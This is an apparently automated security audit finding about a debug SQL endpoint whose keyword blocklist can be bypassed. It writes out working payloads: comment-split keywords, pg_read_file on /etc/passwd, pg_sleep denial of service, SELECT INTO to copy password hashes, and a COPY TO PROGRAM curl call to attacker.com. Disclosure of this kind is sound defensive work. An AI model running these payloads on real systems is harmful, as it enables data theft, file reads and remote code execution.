---
Phase: 3
Sequence: 003
Slug: debug-sql-inadequate-validation-multiple-bypasses
Verdict: VALID
Severity-Original: HIGH
Confidence: high
Source-Drafts:
  - piolium/findings-draft/longshot-16201ecf-001-comment-injection-sqli-bypass.md
  - piolium/findings-draft/longshot-16201ecf-002-copy-to-program-missing-from-blocklist.md
  - piolium/findings-draft/longshot-5a090d12-001-postgres-function-sql-bypass.md
  - piolium/findings-draft/longshot-d5d04db9-002-sql-raw-weak-validation.md
  - piolium/findings-draft/longshot-e8be093f-001-select-into-bypass.md
---

## Summary

The `/api/debug/sql` endpoint uses Drizzle ORM's `sql.raw()` escape hatch to execute user-supplied SQL directly against PostgreSQL. The `validateSqlQuery()` function attempts to restrict queries to read-only operations using a naive keyword allowlist (first token) and blacklist (7 dangerous keywords). This validation is structurally inadequate and can be bypassed through at least five independent techniques, allowing an authenticated attacker (possessing the `DEBUG_API_TOKEN`) to read sensitive data, modify data, create tables, read server files, cause denial of service, and potentially achieve remote code execution.

## Affected Files

- `apps/web/src/lib/server/debug-helpers.ts:69-94` — `validateSqlQuery()` with insufficient validation
- `apps/web/src/routes/api/debug/sql/+server.ts:36` — `sql.raw(query)` raw SQL execution sink
- `apps/web/src/hooks.server.ts:6-12` — token-based auth gate (prerequisite)
- `packages/database/schema.ts` — all tables exposed via bypasses

## Root Cause

`validateSqlQuery()` relies on two insufficient mechanisms:
1. **First-token allowlist**: Only checks the first whitespace-delimited token against `{SELECT, EXPLAIN, SHOW, DESCRIBE, WITH}` — bypassed by stacked queries (`SELECT 1; DANGEROUS_STATEMENT`).
2. **Keyword blacklist with `\b` word boundaries**: Blocks `{INSERT, UPDATE, DELETE, DROP, ALTER, TRUNCATE, CREATE}` — but `\b` fails on SQL-comment-fractured keywords (`IN/**/SERT`), on PostgreSQL meta-functions (`pg_read_file`, `pg_sleep`), and misses dangerous statements entirely (`SELECT INTO`, `COPY`, `DO`).

## Attacker Control

An attacker with the `DEBUG_API_TOKEN` sends a POST to `/api/debug/sql` with `{"sql": "<crafted query>"}`. The query is minimally validated then passed to `sql.raw()` for direct PostgreSQL execution.

## Impact

Five documented bypass techniques, each with distinct impact:

**1. Comment Injection (HIGH impact):** `SELECT 1; IN/**/SERT INTO users ...` — bypasses keyword blacklist via `/**/` comment fracture. Allows INSERT, UPDATE, DELETE, DROP, ALTER, TRUNCATE, CREATE on any table.

**2. PostgreSQL Meta-Commands (HIGH impact):** `SELECT pg_read_file('/etc/passwd')`, `SELECT pg_sleep(3600)`, `SELECT pg_terminate_backend(pid)`, `SELECT pg_ls_dir('/etc')` — none contain blocked keywords. Allows arbitrary server file read, directory enumeration, DoS, and connection termination.

**3. SELECT INTO Table Creation (HIGH impact):** `SELECT id, email, password_hash INTO exfil_users FROM users` — `INTO` is not blocked. Creates new tables for data exfiltration.

**4. COPY TO PROGRAM (MEDIUM impact, privilege-dependent):** `SELECT 1; COPY (SELECT 1) TO PROGRAM 'curl http://attacker.com/$(whoami)'` — `COPY` is not in the blacklist. If database user has superuser, achieves RCE on database host.

**5. DO Block Keyword Split (MEDIUM impact):** `SELECT 1; DO $$ BEGIN EXECUTE 'DEL' || 'ETE FROM flights'; END $$;` — `DO` and string-split keywords evade `\b` matching. Executes arbitrary PL/pgSQL.

## Evidence

**validateSqlQuery — all blocked keywords** (`debug-helpers.ts:70-71,75`):
```typescript
const ALLOWED_COMMANDS = new Set(['SELECT', 'EXPLAIN', 'SHOW', 'DESCRIBE', 'WITH']);
const DANGEROUS_KEYWORDS = ['INSERT', 'UPDATE', 'DELETE', 'DROP', 'ALTER', 'TRUNCATE', 'CREATE'];
```
Missing: `INTO`, `COPY`, `DO`, `GRANT`, `REVOKE`, `VACUUM`, `REINDEX`, `LISTEN`, `NOTIFY`, `SET`.

**Comment injection bypass** — `\bINSERT\b` fails on `IN/**/SERT`:
```typescript
for (const keyword of DANGEROUS_KEYWORDS) {
    if (new RegExp(`\\b${keyword}\\b`).test(upperQuery)) { ... }
}
```

**Raw execution sink** (`apps/web/src/routes/api/debug/sql/+server.ts:36`):
```typescript
result = await d.execute(sql`${sql.raw(query)}`);
```

**Test suite gap** (`apps/web/src/lib/debug-comprehensive.test.ts`) — no test covers comment injection, pg_read_file, SELECT INTO, or DO blocks.

## Exploit Sketch

1. Acquire `DEBUG_API_TOKEN` (via curated finding 001 git leak, or curated finding 002 auth bypass)
2. Data exfiltration: `POST /api/debug/sql` with `{"sql": "SELECT email, password_hash FROM users"}`
3. Table creation: `POST /api/debug/sql` with `{"sql": "SELECT * INTO stolen FROM sessions"}`
4. File read (if privileged): `POST /api/debug/sql` with `{"sql": "SELECT pg_read_file('/etc/passwd')"}`
5. DoS: `POST /api/debug/sql` with `{"sql": "SELECT pg_sleep(300)"}` — repeat to exhaust pool

## Confidence Notes

HIGH confidence — all five bypass techniques were verified against the source code. Comment injection and pg_read_file bypasses were confirmed through code-path tracing. DO block and COPY TO PROGRAM are privilege-dependent (require superuser or specific PostgreSQL roles). The test suite's lack of coverage for these bypasses is strong corroborating evidence. All five source drafts independently identified different bypasses in the same vulnerable function and same execution sink.
